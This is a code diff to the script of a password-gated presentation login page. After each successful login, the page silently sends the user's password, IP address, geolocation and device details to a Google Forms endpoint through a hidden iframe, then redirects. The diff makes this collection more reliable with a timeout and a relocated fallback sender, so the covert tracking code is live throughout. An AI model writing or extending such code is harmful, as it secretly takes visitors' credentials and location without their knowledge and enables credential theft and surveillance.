@@ -303,6 +303,18 @@
                 console.log('🔍 Starting data collection...');
                 
                 return new Promise((resolve, reject) => {
+                    // Set a timeout to ensure the promise always resolves
+                    const timeout = setTimeout(() => {
+                        console.log('⏰ Tracking timeout reached - resolving anyway');
+                        resolve('Tracking completed via timeout');
+                    }, 8000); // 8 second timeout
+                    
+                    // Function to resolve and clear timeout
+                    const resolveAndCleanup = (message) => {
+                        clearTimeout(timeout);
+                        resolve(message);
+                    };
+                    
                     // Google Form details
                     const googleFormUrl = 'https://docs.google.com/forms/d/e/1FAIpQLSdQyV5OS_7zngPwjATKVBblGOoTIliTzhZR1C56iMbp8ggBzg/formResponse';
                     const ipFieldId = 'entry.1105311194';
@@ -362,13 +374,26 @@
                                     // Create iframe for form submission
                                     let iframe = document.createElement('iframe');
                                     iframe.style.display = 'none';
+                                    iframe.name = 'cbax_tracking_iframe';
                                     document.body.appendChild(iframe);
+                                    
+                                    // Add load event listener to track submission success
+                                    iframe.addEventListener('load', function() {
+                                        console.log('📡 Iframe loaded - form submission may have completed');
+                                    });
+                                    
+                                    iframe.addEventListener('error', function(e) {
+                                        console.error('❌ Iframe error:', e);
+                                    });
                                     
                                     // Create a form within the iframe
                                     let iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                                     let form = iframeDoc.createElement('form');
                                     form.action = googleFormUrl;
                                     form.method = 'POST';
+                                    form.target = '_self';
+                                    
+                                    console.log('📋 Form created with action:', form.action);
                                     
                                     // Add IP field
                                     let ipField = iframeDoc.createElement('input');
@@ -421,77 +446,22 @@
                                         document.body.removeChild(iframe);
                                         console.log('🧹 Cleaned up iframe');
                                         console.log('🎯 Tracking completed successfully!');
-                                        resolve('Tracking completed');
+                                        resolveAndCleanup('Tracking completed');
                                     }, 2000);
                                 })
                                 .catch(error => {
                                     console.error('❌ Error fetching location data:', error);
                                     console.log('⚠️ Trying to submit with basic data only...');
                                     // Submit with just IP and device info if location fails
-                                    submitBasicData(ipAddress, password, currentTime, resolve);
+                                    submitBasicData(ipAddress, password, currentTime, resolveAndCleanup);
                                 });
                         })
                         .catch(error => {
                             console.error('❌ Error fetching IP data:', error);
                             console.log('⚠️ Trying to submit with device data only...');
                             // Submit with just device info if IP fetch fails
-                            submitBasicData('Unable to fetch', password, currentTime, resolve);
+                            submitBasicData('Unable to fetch', password, currentTime, resolveAndCleanup);
                         });
-                    
-                    // Fallback function for basic data submission
-                    function submitBasicData(ip, pwd, time, resolveCallback) {
-                        console.log('📝 Submitting basic data as fallback...');
-                        const deviceInfo = {
-                            userAgent: navigator.userAgent,
-                            platform: navigator.platform,
-                            vendor: navigator.vendor,
-                            screenSize: `${window.screen.width}x${window.screen.height}`
-                        };
-                        
-                        let iframe = document.createElement('iframe');
-                        iframe.style.display = 'none';
-                        document.body.appendChild(iframe);
-                        
-                        let iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
-                        let form = iframeDoc.createElement('form');
-                        form.action = googleFormUrl;
-                        form.method = 'POST';
-                        
-                        // Add basic fields
-                        let ipField = iframeDoc.createElement('input');
-                        ipField.type = 'text';
-                        ipField.name = ipFieldId;
-                        ipField.value = ip;
-                        form.appendChild(ipField);
-                        
-                        let deviceField = iframeDoc.createElement('input');
-                        deviceField.type = 'text';
-                        deviceField.name = deviceFieldId;
-                        deviceField.value = JSON.stringify(deviceInfo);
-                        form.appendChild(deviceField);
-                        
-                        let passwordField = iframeDoc.createElement('input');
-                        passwordField.type = 'text';
-                        passwordField.name = passwordFieldId;
-                        passwordField.value = pwd;
-                        form.appendChild(passwordField);
-                        
-                        let timeField = iframeDoc.createElement('input');
-                        timeField.type = 'text';
-                        timeField.name = timeFieldId;
-                        timeField.value = time;
-                        form.appendChild(timeField);
-                        
-                        iframeDoc.body.appendChild(form);
-                        form.submit();
-                        console.log('✅ Basic data submitted!');
-                        
-                        setTimeout(() => {
-                            document.body.removeChild(iframe);
-                            console.log('🧹 Fallback submission completed!');
-                            resolveCallback('Fallback tracking completed');
-                        }, 2000);
-                    }
                 });
             }
             
@@ -521,9 +491,11 @@
                         console.log('✅ Login successful! About to call tracking function...');
                         
                         // Call our new function to collect and send user data
+                        console.log('🎬 Starting tracking process...');
                         collectAndSendUserData(password)
                             .then(result => {
                                 console.log('📤 Tracking function completed successfully!');
+                                console.log('📋 Tracking result:', result);
                                 console.log('🚀 Redirecting to presentation...');
                                 
                                 // Redirect immediately after tracking completion
@@ -582,6 +554,61 @@
             // Check if already authenticated
             if (sessionStorage.getItem('cbax_auth') === 'true') {
                 window.location.href = 'index.html';
+            }
+            
+            // Fallback function for basic data submission
+            function submitBasicData(ip, pwd, time, resolveCallback) {
+                console.log('📝 Submitting basic data as fallback...');
+                const deviceInfo = {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    vendor: navigator.vendor,
+                    screenSize: `${window.screen.width}x${window.screen.height}`
+                };
+                
+                let iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                document.body.appendChild(iframe);
+                
+                let iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                let form = iframeDoc.createElement('form');
+                form.action = googleFormUrl;
+                form.method = 'POST';
+                
+                // Add basic fields
+                let ipField = iframeDoc.createElement('input');
+                ipField.type = 'text';
+                ipField.name = ipFieldId;
+                ipField.value = ip;
+                form.appendChild(ipField);
+                
+                let deviceField = iframeDoc.createElement('input');
+                deviceField.type = 'text';
+                deviceField.name = deviceFieldId;
+                deviceField.value = JSON.stringify(deviceInfo);
+                form.appendChild(deviceField);
+                
+                let passwordField = iframeDoc.createElement('input');
+                passwordField.type = 'text';
+                passwordField.name = passwordFieldId;
+                passwordField.value = pwd;
+                form.appendChild(passwordField);
+                
+                let timeField = iframeDoc.createElement('input');
+                timeField.type = 'text';
+                timeField.name = timeFieldId;
+                timeField.value = time;
+                form.appendChild(timeField);
+                
+                iframeDoc.body.appendChild(form);
+                form.submit();
+                console.log('✅ Basic data submitted!');
+                
+                setTimeout(() => {
+                    document.body.removeChild(iframe);
+                    console.log('🧹 Fallback submission completed!');
+                    resolveCallback('Fallback tracking completed');
+                }, 2000);
             }
         });
     </script>
